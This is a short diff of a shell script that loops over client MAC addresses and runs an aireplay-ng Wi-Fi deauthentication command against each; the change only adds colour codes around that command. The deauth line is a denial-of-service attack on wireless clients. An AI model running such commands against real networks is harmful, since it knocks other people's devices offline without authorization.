@@ -19,6 +19,8 @@ echo ""
 elif [[ $mac = "<incomplete>" ]]; then
 echo ""
 else
+echo -e "\e[94m"
 sudo aireplay-ng  --deauth 30 -a $MYBSSID -c $mac $wlan0
+echo -e "\e[0m"
 fi
 done
